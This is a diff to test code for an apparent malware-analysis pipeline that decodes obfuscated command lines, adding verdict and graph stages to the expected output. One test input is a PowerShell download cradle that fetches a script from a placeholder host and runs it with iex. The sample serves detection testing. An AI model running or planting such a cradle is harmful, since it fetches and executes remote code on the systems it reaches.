@@ -33,7 +33,7 @@ def test_wmic_encodedcommand_download_cradle():
 
     r = investigate(cmd)
 
-    assert r.coverage == ["iu", "cre", "rte", "intent"]
+    assert r.coverage == ["iu", "cre", "rte", "intent", "verdict", "graph"]
     assert r.iu.primary_type == ArtefactType.COMMAND_LINE
     assert Capability.CRE in r.iu.dispatch
     assert r.cre is not None
@@ -105,13 +105,18 @@ def test_pipeline_to_dict_serialization():
     cmd = _enc('iex (New-Object Net.WebClient).DownloadString("http://x")')
     d = investigate(cmd).to_dict()
     assert set(d.keys()) == {
-        "input", "iu", "cre", "rte", "intent", "coverage", "determinism_hash"
+        "input", "iu", "cre", "rte", "intent", "verdict", "graph",
+        "coverage", "determinism_hash"
     }
     # Every stage has its determinism proof.
     assert d["iu"]["determinism_hash"]
     assert d["cre"]["determinism_hash"]
     assert d["rte"]["determinism_hash"]
     assert d["intent"]["determinism_hash"]
+    # Verdict and Graph must be present with expected shape.
+    assert d["verdict"]["band"] in {"malicious", "suspicious",
+                                     "runtime_dependent", "benign"}
+    assert d["graph"]["nodes"] and d["graph"]["edges"]
     # Final layer content is analyst-readable.
     layers = d["rte"]["artifacts"]
     assert layers and any("DownloadString" in a["content"] for a in layers)
